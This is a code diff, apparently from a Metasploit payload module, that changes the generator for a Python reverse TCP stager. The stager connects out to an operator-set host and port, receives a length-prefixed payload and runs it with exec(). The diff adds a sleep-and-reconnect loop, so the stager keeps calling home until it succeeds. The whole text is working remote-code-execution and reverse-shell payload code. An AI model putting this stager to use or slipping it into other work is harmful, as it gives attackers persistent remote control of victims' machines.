@@ -23,7 +23,8 @@ module Payload::Python::ReverseTcp
     conf = {
       port:        datastore['LPORT'],
       host:        datastore['LHOST'],
-      retry_count: datastore['ReverseConnectRetries'],
+      retry_count: datastore['StagerRetryCount'],
+      retry_wait:  datastore['StagerRetryWait'],
     }
 
     generate_reverse_tcp(conf)
@@ -44,14 +45,22 @@ module Payload::Python::ReverseTcp
   def generate_reverse_tcp(opts={})
     # Set up the socket
     cmd  = "import socket,struct\n"
-    cmd << "s=socket.socket(2,socket.SOCK_STREAM)\n" # socket.AF_INET = 2
-    cmd << "s.connect(('#{opts[:host]}',#{opts[:port]}))\n"
+    cmd << "import time\n"
+    cmd << "def connect():\n"
+    cmd << "\ttry:\n"
+    cmd << "\t\ts=socket.socket(2,socket.SOCK_STREAM)\n" # socket.AF_INET = 2
+    cmd << "\t\ts.connect(('#{opts[:host]}',#{opts[:port]}))\n"
     cmd << py_send_uuid if include_send_uuid
-    cmd << "l=struct.unpack('>I',s.recv(4))[0]\n"
-    cmd << "d=s.recv(l)\n"
-    cmd << "while len(d)<l:\n"
-    cmd << "\td+=s.recv(l-len(d))\n"
-    cmd << "exec(d,{'s':s})\n"
+    cmd << "\t\tl=struct.unpack('>I',s.recv(4))[0]\n"
+    cmd << "\t\td=s.recv(l)\n"
+    cmd << "\t\twhile len(d)<l:\n"
+    cmd << "\t\t\td+=s.recv(l-len(d))\n"
+    cmd << "\t\texec(d,{'s':s})\n"
+    cmd << "\texcept Exception:\n"
+    cmd << "\t\t\ttime.sleep(#{opts[:retry_wait]})\n"
+    cmd << "\t\t\tconnect()\n"
+    cmd << "connect()\n"
+    
 
     py_create_exec_stub(cmd)
   end
